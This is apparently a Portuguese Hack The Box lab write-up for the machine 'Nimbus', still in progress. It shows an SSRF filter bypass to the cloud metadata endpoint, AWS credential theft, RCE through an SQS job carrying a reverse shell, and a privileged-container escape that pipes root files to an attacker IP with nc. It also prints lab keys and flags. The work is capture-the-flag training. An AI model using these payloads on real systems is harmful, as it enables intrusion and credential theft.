# HTB - Nimbus

## Informações Gerais
- **IP:** 10.129.40.92
- **Hostname:** nimbus.htb / aws.nimbus.htb
- **OS:** Linux (Ubuntu)
- **Dificuldade:** ?
- **Versão da app:** nimbus v1.4.2

---

## Enumeração

### Nmap
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp open  http    nginx 1.24.0
```
- Apenas portas 22 e 80 abertas
- Portas 3000, 4566, 8080, 9090 — fechadas (sem LocalStack externo)

### /etc/hosts
```
10.129.40.92  nimbus.htb
10.129.40.92  aws.nimbus.htb
```

---

## Web — nimbus.htb (porta 80)

### Endpoints descobertos
| Endpoint | Método | Status | Descrição |
|----------|--------|--------|-----------|
| `/` | GET | 200 | Home — Internal Job Scheduler |
| `/jobs` | GET/POST | 200 | Submissão de jobs (SEM AUTH!) |
| `/jobs/preview` | POST | 200 | Processa e exibe YAML |
| `/login` | GET | 200 | Login DESATIVADO (migrando Okta) |
| `/api/v1/health` | GET | 200 | Healthcheck — vaza subdomain! |
| `/docs` | GET | 404 | Não existe |

### Achados Críticos

**🔴 Login desativado:**
> "SSO is being migrated to Okta. ETA: end of sprint."
> "the job submitter is **unauthenticated** during the migration window"

**🔴 Subdomain vazado via `/api/v1/health`:**
```json
{"services":{
  "queue":    {"endpoint":"http://aws.nimbus.htb","status":"ok"},
  "scheduler":{"endpoint":"http://aws.nimbus.htb","status":"ok"},
  "storage":  {"endpoint":"http://aws.nimbus.htb","status":"ok"}
}, "status":"healthy","version":"1.4.2"}
```

**🔴 Usuário mencionado:**
- `marcus` — DevOps lead / SSH key approver

---

## SSRF — /jobs/preview (URL mode)

### Como funciona
- POST para `/jobs/preview` com `url=http://...`
- Servidor **busca** a URL e exibe "Raw response"
- **SSRF confirmado**: `10.129.40.92` fez GET no nosso servidor

### Filtros identificados
| Tentativa | Resultado |
|-----------|-----------|
| `file://` | ❌ Bloqueado — só http/https |
| URL sem `.yaml`/`.yml` | ❌ Bloqueado — extensão obrigatória |
| `http://aws.nimbus.htb/*.yaml` | ❌ Bloqueado — IP interno |
| `http://[::ffff:10.129.39.218]/test.yaml` | ❌ Bloqueado — IPv6 também |
| `http://10.10.14.24:8080/test.yaml` | ✅ **FUNCIONA** — IP externo permitido |
| Redirect 302 para interno | ❌ Servidor não segue redirects |

### Comportamento do `/jobs/preview`
- Não executa o `command` no momento do preview
- Diz "Job **would be** submitted to queue **nimbus-jobs**"
- Fila: `nimbus-jobs` | Região: `us-east-1` | Worker: `nimbus/worker`
- **Jobs não são executados no preview — só validados**

---

## aws.nimbus.htb

- Mock de serviços AWS (STS, S3, SQS)
- Porta 80 (mesmo servidor que nimbus.htb)
- Responde com erro AWS STS para todas as requisições sem credenciais:
```xml
<ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error><Code>InvalidClientTokenId</Code>
  <Message>The security token included in the request is invalid.</Message>
  </Error>
  <RequestId>p7518495-adc4-1191-49n2-4m70d8sdf922</RequestId>
</ErrorResponse>
```
- RequestId **sempre igual** → mock customizado, não LocalStack real
- Credenciais `test`/`test` → falham

---

## YAML — Campos testados

```yaml
name: <string>          # nome do job
schedule: "0 2 * * *"  # cron
runtime: bash           # runtime (bash, python3.11, etc.)
command: <cmd>          # comando a executar (aceito, mas não executa no preview)
output: <url>           # a testar
callback: <url>         # a testar
webhook: <url>          # a testar
notify: <url>           # a testar
```

---

## Próximos Passos

- [ ] **Proxy via Kali** — usar Kali como intermediário para acessar `aws.nimbus.htb`:
  ```bash
  python3 /root/proxy.py  # proxy que encaminha para aws.nimbus.htb
  curl -X POST http://nimbus.htb/jobs/preview -d 'url=http://10.10.14.24:8080/test.yaml'
  ```
- [ ] **Gobuster** — enumerar mais endpoints em nimbus.htb
- [ ] **Campos callback/webhook no YAML** — worker pode enviar output para URL
- [ ] **Encontrar credenciais AWS** para interagir com aws.nimbus.htb (S3/SQS)

---

## Foothold

### SSRF Bypass → IMDS → Credenciais AWS

**Bypass do filtro:** IP decimal + query param terminando em `.yaml`
```
http://2852039166/latest/meta-data/iam/security-credentials/?x=test.yaml
```
- Role: `nimbus-web-role`
- `AccessKeyId`: `ASIAQX4PG7L2K9M3N5R8`
- `SecretAccessKey`: `bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs`
- `Token`: (temporário, expira em 6h)

**Permissões da role:**
- `sqs:ListQueues` ✔
- `sqs:SendMessage` ✔ ← vetor de RCE!
- `sqs:ReceiveMessage` ✘

**RCE via SQS send_message com campo `script`:**
```bash
aws sqs send-message \
  --queue-url "http://aws.nimbus.htb/847219365028/nimbus-jobs" \
  --message-body '{"name":"pwn","runtime":"python3.11","script":"<python_reverse_shell>"}'
```

**Shell obtida:** `worker@9272750ac5ab:/app` (container Docker)

**Credenciais do worker (permanentes AKIA):**
- `AWS_ACCESS_KEY_ID`: `AKIA7P3R9X4K8M2L5VHN`
- `AWS_SECRET_ACCESS_KEY`: `dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh`
- `AWS_ENDPOINT_URL`: `http://aws.nimbus.htb`
- `QUEUE_URL`: `http://aws.nimbus.htb/847219365028/nimbus-jobs`

**LocalStack interno (sem auth!):** `http://floci:4566`
- Bucket S3 encontrado: `nimbus-dev-artifacts`

---

## Flags
- **User flag:** `d73f72ac5eee849177272f985357d559` ✔ *(nova instância)*
- **User2 flag:** `bcb0d7ca472000a8de36bf981cc42e66` ✔
- **Root flag:** ⏳ *em andamento*

---

## Privilege Escalation → Root (EM ANDAMENTO)

### Vetor escolhido: SQS → Worker → CodeBuild privilegiado → nsenter / S3

#### Comportamento do ambiente
- A shell do worker (`worker@dbb0d35afdaf:/app`) **cai após ~15 segundos** de inatividade
- Não é possível verificar builds com `codebuild:BatchGetBuilds` de fora — a `nimbus-web-role` recebe **403**
- O container CodeBuild, mesmo privilegiado, está em uma **rede Docker isolada** — não consegue fazer `nc` de volta para `10.10.14.24` mesmo com `nsenter --net`
- A VPN funciona (worker → Kali:1337 funciona) mas CodeBuild → Kali:1338 é bloqueado pela topologia de rede interna

#### Métodos de exfiltração tentados
| Método | Resultado |
|--------|-----------|
| `nc 10.10.14.24 1337` (porta 1337) | ✅ Funciona (worker reverse shell) |
| `nc 10.10.14.24 1338` (porta 1338 — CodeBuild) | ❌ Sem conexão (rede isolada do build container) |
| `cat /proc/1/root/root/root.txt` (no worker) | 🔄 A testar |
| `nsenter -t 1 -m -u -i -n -p -- cat /root/root.txt` | 🔄 A testar no worker |
| S3 exfiltração via `floci:4566` | 🔄 Plano B configurado |

#### Exploit enviado via SQS (buildspec atual)
```yaml
version: 0.2
phases:
  build:
    commands:
      - nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c "cat /root/root.txt | nc 10.10.14.24 1338" || true
```

#### Exploit S3 (Plano B — não depende de rede reversa)
```yaml
version: 0.2
phases:
  build:
    commands:
      - nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c "cat /root/root.txt" > /tmp/flag.txt 2>&1 || echo "nsenter falhou" > /tmp/flag.txt
      - aws --endpoint-url http://floci:4566 --region us-east-1 s3 cp /tmp/flag.txt s3://nimbus-dev-artifacts/root_flag.txt
```

#### Ler a flag via S3 (do Kali)
```bash
aws --profile nimbus \
    --endpoint-url http://aws.nimbus.htb \
    --region us-east-1 \
    s3 cp s3://nimbus-dev-artifacts/root_flag.txt -
```

#### Comandos rápidos para usar na shell do worker (copiar antes de conectar!)
```bash
# Tenta 1 — leitura direta via /proc (mais rápido)
cat /proc/1/root/root/root.txt

# Tenta 2 — nsenter no worker
nsenter -t 1 -m -u -i -n -p -- cat /root/root.txt 2>&1

# Tenta 3 — nsenter + nc de dentro do worker (porta 1337)
nsenter -t 1 -m -u -i -n -p -- bash -c 'cat /root/root.txt | nc 10.10.14.24 1337'
```

### Conceitos da Escalada (CodeBuild + Modprobe Escape)
1. **Acesso Admin via LocalStack Interno**: Ao interagir diretamente com o LocalStack em `floci:4566` de dentro do container (evitando o proxy Nginx externo), as restrições de IAM não são validadas pelo ambiente de teste.
2. **Criação de Container Privilegiado**: Usando a API do CodeBuild (`create_project` e `start_build`), é possível lançar um container de build com a flag `privilegedMode: True`, que compartilha acesso ao kernel real do host.
3. **Escape do Container (nsenter)**: 
   - Um container privilegiado compartilha o kernel do host.
   - `nsenter --target 1 --mount --uts --ipc --net --pid` entra em todos os namespaces do processo PID 1 do host.
   - Permite executar comandos como se estivesse diretamente no host.
4. **Escape via /proc/1/root**:
   - Em containers privilegiados, `/proc/1/root` aponta para o filesystem raiz do host.
   - `cat /proc/1/root/root/root.txt` lê diretamente a flag sem precisar de nsenter.

## Comandos Úteis

```bash
# Nmap
nmap -sC -sV -oN nmap/initial_scan.txt nimbus.htb

# Gobuster diretórios
gobuster dir -u http://nimbus.htb \
  -w /usr/share/wordlists/dirb/common.txt \
  -x yaml,yml,json,conf,py,txt \
  -o web/gobuster_dir.txt -q

# SSRF — servidor no Kali
cd /root && python3 -m http.server 8080

# SSRF — submeter URL
curl -s -X POST http://nimbus.htb/jobs/preview \
  -d 'url=http://10.10.14.24:8080/test.yaml'

# Proxy Kali → aws.nimbus.htb
python3 /root/proxy.py

# AWS CLI contra aws.nimbus.htb (requer credenciais válidas)
AWS_ACCESS_KEY_ID=??? AWS_SECRET_ACCESS_KEY=??? \
  aws --endpoint-url http://aws.nimbus.htb s3 ls --region us-east-1
```
